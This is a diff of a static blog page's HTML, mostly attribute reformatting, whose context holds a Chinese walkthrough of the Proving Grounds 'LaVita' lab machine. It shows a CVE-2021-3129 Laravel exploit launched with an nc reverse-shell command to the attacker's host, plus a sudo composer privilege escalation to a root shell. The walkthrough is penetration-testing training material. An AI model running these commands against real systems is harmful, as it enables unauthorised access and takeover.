@@ -167,9 +167,7 @@
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off"
-           placeholder="Searching..." spellcheck="false"
-           type="search" class="search-input">
+    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
   </div>
   <span class="popup-btn-close">
     <i class="fa fa-times-circle"></i>
@@ -211,7 +209,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Yiaos">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content>
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -281,7 +279,7 @@
 <p><img src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=ODcyNDg5N2NmMjNhNWExNTIzYThmOWJmNGQyYjEwYTNfUkVFRTlMVFp0Y0VoZFNJYktLYTVvTlF3OXRIdHZWNGdfVG9rZW46QjlFaWJxOUVPb0dHSmp4Y1RReGNCazhqbk1oXzE3Mzk3MjM2ODY6MTczOTcyNzI4Nl9WNA"></p>
 <h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><p>searchsploit 搜索 laravel, 发现8.4.2 debug mode下有rce漏洞，先开启debug mode, 开启之后未ENABLED状态，但是代码利用不成功</p>
 <p><img src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=NDZjODlmYWUyNzEwMWM4YjAxZjM1MjBmODdhNDg5YWVfYVU5b2h6cnJMVTFVTDByWFRzM2N0RENqbFA1MG9wVHhfVG9rZW46VHpUM2JDMGtJb0VZZ3J4d1lGeGNxaTNLblJkXzE3Mzk3MjM2ODY6MTczOTcyNzI4Nl9WNA"></p>
-<p>根据github链接,  cve编号是 CVE-2021-3129, 找到 <a target="_blank" rel="noopener" href="https://github.com/0x0d3ad/CVE-2021-3129">https://github.com/0x0d3ad/CVE-2021-3129</a></p>
+<p>根据github链接,  cve编号是 CVE-2021-3129, 找到 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/0x0d3ad/CVE-2021-3129">https://github.com/0x0d3ad/CVE-2021-3129</a></p>
 <p><img src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjE0NDM3ZGI4YTQwMGEwYzU1MzQyOTY1ZGZjODZhOTFfcWJXZGtRcmk4SHlQc3lQcjYyejdPRkhWUXZYd0xUYzFfVG9rZW46VTcxamJkTFBNb1RvZ054N081UWNjbXFBbmFkXzE3Mzk3MjM2ODY6MTczOTcyNzI4Nl9WNA"></p>
 <p>克隆执行利用代码，成功拿到反弹shell</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ python CVE-<span class="number">2021</span>-<span class="number">3129.</span>py http://<span class="number">192.168</span><span class="number">.212</span><span class="number">.38</span> --cmd <span class="string">&quot;nc 192.168.45.234 4444 -e /bin/bash&quot;</span></span><br><span class="line">[+] Generating PHAR payload <span class="keyword">for</span> command: nc <span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span> <span class="number">4444</span> -e /<span class="built_in">bin</span>/bash</span><br><span class="line">[+] Trying to clear logs</span><br><span class="line">[+] Logs cleared</span><br><span class="line">[+] Convert log file to PHAR</span><br><span class="line">[+] Successfully converted logs to PHAR</span><br></pre></td></tr></table></figure>
@@ -306,7 +304,7 @@
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">80</span></span><br><span class="line">listening on [<span class="built_in">any</span>] <span class="number">80</span> ...</span><br><span class="line">connect to [<span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span><span class="number">.212</span><span class="number">.38</span>] <span class="number">54526</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">1001</span>(skunk) gid=<span class="number">1001</span>(skunk) groups=<span class="number">1001</span>(skunk),<span class="number">27</span>(sudo),<span class="number">33</span>(www-data)</span><br></pre></td></tr></table></figure>
 
-<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><p>skunk可以在不需要密码的情况下执行composer， 在<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/composer/%E6%89%BE%E5%88%B0%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%8C%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96shell">https://gtfobins.github.io/gtfobins/composer/找到利用方法，成功获取shell</a></p>
+<h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><p>skunk可以在不需要密码的情况下执行composer， 在<a target="_blank" rel="external nofollow noopener noreferrer" href="https://gtfobins.github.io/gtfobins/composer/%E6%89%BE%E5%88%B0%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%8C%E6%88%90%E5%8A%9F%E8%8E%B7%E5%8F%96shell">https://gtfobins.github.io/gtfobins/composer/找到利用方法，成功获取shell</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> skunk on debian:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/<span class="built_in">bin</span>\:/usr/sbin\:/usr/<span class="built_in">bin</span>\:/sbin\:/<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line">User skunk may run the following commands on debian:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (root) NOPASSWD: /usr/<span class="built_in">bin</span>/composer --working-<span class="built_in">dir</span>\=/var/www/html/lavita *</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&#123;&quot;scripts&quot;:&#123;&quot;x&quot;:&quot;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;&#125;&#125;&#x27; &gt;/var/www/html/lavita/composer.json</span><br><span class="line">sudo composer --working-dir\=/var/www/html/lavita * run-script x</span><br></pre></td></tr></table></figure>
@@ -330,7 +328,7 @@
     <a href="https://thiiiiink.com/post/20250217003515.html" title="Proving Grounds Practice - LaVita">https://thiiiiink.com/post/20250217003515.html</a>
   </li>
   <li class="post-copyright-license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
   </li>
 </ul>
 </div>
@@ -426,11 +424,11 @@
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/yiaos" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yiaos" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+        <a href="https://github.com/yiaos" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yiaos" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
       </span>
   </div>
   <div class="cc-license motion-element" itemprop="license">
-    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="external nofollow noopener noreferrer" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
   </div>
 
 
